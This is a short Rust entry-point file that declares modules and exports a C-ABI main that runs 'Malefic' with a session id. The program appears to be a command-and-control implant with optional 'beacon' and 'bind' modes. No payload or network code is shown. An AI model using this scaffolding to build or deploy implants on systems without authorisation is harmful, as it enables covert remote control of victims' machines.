mod malefic;
mod meta;
mod stub;

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;

use crate::malefic::Malefic;

#[no_mangle]
pub extern "C" fn main() {
    use futures::executor::block_on;
    let _ = block_on(async { Malefic::run(malefic_proto::get_sid()).await });
}
